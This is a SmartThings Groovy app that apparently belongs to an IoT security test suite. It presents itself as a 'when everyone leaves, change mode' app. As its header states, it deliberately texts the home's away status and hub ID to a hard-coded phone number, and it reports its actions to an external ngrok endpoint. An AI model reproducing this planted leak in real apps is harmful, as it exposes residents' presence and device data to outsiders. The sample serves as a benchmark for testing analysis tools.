/**
 *  
 *
 *  Hardcoded Information 4
 *
 *
 *  User contact information (e.g., Phone number) is hard-coded in theapp and information leaked via hard-coded information.
 */

definition(
    name: "Hard-coded information 4",
    namespace: "CSL",
    author: "Amit K Sikder",
    updated: "Leo Babun",
    description: "Hard-coded information used to leak variables defined with user inputs. Both user input and hard-coded information is declared with same variable name in line 33 and line 118 respectively. Status of the device (implicit permission)and Hub Id (explicit permission) is leaked via hard-coded phone number",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/App-LightUpMyWorld.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/App-LightUpMyWorld@2x.png"
)

preferences {
	section("When all of these people leave home") {
		input "people", "capability.presenceSensor", multiple: true
	}
	section("Change to this mode") {
		input "newMode", "mode", title: "Mode?"
	}
	section("False alarm threshold (defaults to 10 min)") {
		input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false
	}
	section( "Notifications" ) {
		input("recipients", "contact", title: "Send notifications to", required: false) {
			input "sendPushMessage", "enum", title: "Send a push notification?", options: ["Yes", "No"], required: false
			input "phone", "phone", title: "Send a Text Message?", required: false
		}
	}

}

def installed() {
	log.debug "Installed with settings: ${settings}"
        // commented out log statement because presence sensor label could contain user's name
	//log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"
	subscribe(people, "presence", presence)
}

def updated() {
	log.debug "Updated with settings: ${settings}"
        // commented out log statement because presence sensor label could contain user's name
	//log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"
	unsubscribe()
	subscribe(people, "presence", presence)
}

def presence(evt)
{
	log.debug "evt.name: $evt.value"
        state.Id = getId()
	if (evt.value == "not present") {
		if (location.mode != newMode) {
			log.debug "checking if everyone is away"
			if (everyoneIsAway()) {
			state.msg = "everyone is away!!!"
				log.debug "starting sequence"
				runIn(findFalseAlarmThreshold() * 60, "takeAction", [overwrite: false])
			}
		}
		else {state.msg = "person in the room!!!"
			log.debug "mode is the same, not evaluating"
		}
	}
	else {
		log.debug "present; doing nothing"
	}
}

def takeAction() {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	if (everyoneIsAway()) {
		def threshold = 1000 * 60 * findFalseAlarmThreshold() - 1000
		def awayLongEnough = people.findAll { person ->
			def presenceState = person.currentState("presence")
			if (!presenceState) {
				// This device has yet to check in and has no presence state, treat it as not away long enough
				return false
			}
			def elapsed = now() - presenceState.rawDateCreated.time
			elapsed >= threshold
		}
		log.debug "Found ${awayLongEnough.size()} out of ${people.size()} person(s) who were away long enough"
		if (awayLongEnough.size() == people.size()) {
			// TODO -- uncomment when app label is available
			def message = "SmartThings changed your mode to '${newMode}' because everyone left home"
			log.info message
			send(message)
			cnt++ // instrumented code
    		data['action'+cnt] = "sink1 : setLocationMode $newMode"  // instrumented code
			sendRequest(data) // instrumented code
			setLocationMode(newMode)
		} else {
			log.debug "not everyone has been away long enough; doing nothing"
		}
	} else {
    	log.debug "not everyone is away; doing nothing"
    }
}

private everyoneIsAway()
{
	def result = true
	for (person in people) {
		if (person.currentPresence == "present") {
			result = false
			break
		}
	}
	log.debug "everyoneIsAway: $result"
	return result
}

private send(msg) {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code

	def message = "State is ${state.msg} and Hub id is ${state.Id}";
	def phone = "(111)-111-1111"
	if (location.contactBookEnabled) {
        log.debug("sending notifications to: ${recipients?.size()}")
		cnt++ // instrumented code
		data['action'+cnt] = "sink2 : sendNotificationToContacts ${msg} ${recipients}"  // instrumented code
		sendNotificationToContacts(msg, recipients)  
	}
	else  {
		if (sendPushMessage != "No") {
			log.debug("sending push message")
			cnt++ // instrumented code
			data['action'+cnt] = "sink3 : sendPush ${message}"  // instrumented code
			sendPush(message)  
		}

		if (phone) {
			log.debug("sending text message")
			cnt++ // instrumented code
			data['action'+cnt] = "sink4 : sendSms ${phone} ${message}"  // instrumented code
			sendSms(phone, message)  
		}
	}
	log.debug msg
	sendRequest(data)  // instrumented code
}

private findFalseAlarmThreshold() {
	(falseAlarmThreshold != null && falseAlarmThreshold != "") ? falseAlarmThreshold : 10
}

// the following simulates instrumented end point codes for web services hookup
mappings {
	// this endpoint supports a GET request. It will execute the specified command on the configured switches
	path("/people/:command") {
		//log.info("/people/:command")
		action: [
				GET: "people"
		]
	}
}

/*
	this handles a GET request to the /people/:command endpoint.
    /people/on will turn the presenceSensor on, and /people/off will turn the presenceSensor off.
    This method doesn't work because only Device handler can send/modify device states (present or not present)
    It cannot be modified in the app code
*/
void people() {
	// use the built-in request object to get the command parameter
	def command = params.command
	log.debug("Receive command: $command")
	// inject all possible device commands
	// following is not the exhaustive list yet
	switch(command) {
		case "on":
			people.on()
			break
		case "off":
			people.off()
			break
		case "wet":
			people.wet()
			break
		case "dry":
			people.dry()
			break
		case "present":
			people.present()
			break
		case "notpresent":
			people.notpresent()
			break
		case "active":
			people.active()
			break
		case "inactive":
			people.inactive()
			break
		default:
			httpError(400, "$command is not a valid command for all switches specified")
	}
}


mappings {
	// this is the end point for simulating user location
	path("/location/:command") {
		//log.info("/location/:command")
		action: [
				GET: "location"
		]
	}
}

void location() {
	//eventHandler(evt)
	def command = params.command
	log.debug("Receive command: $command")

	// format command
	command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

	def currMode = location.currentMode // "Home", "Away", etc.
	log.debug "current mode is $currMode"

	location.setMode(command)  // change location
}

def sendRequest(data) {
	// [q:'Minneapolis', mode: 'json']
	def params = [
			uri:  'https://62f870a15b61.ngrok.io/',
			path: 'fuzzthings/things.php',
			contentType: 'application/json',
			query: data
	]
	try {
		httpGet(params){resp ->
			log.debug "connection okay"
		}
	} catch (e) {
		log.error "error: $e"
	}
}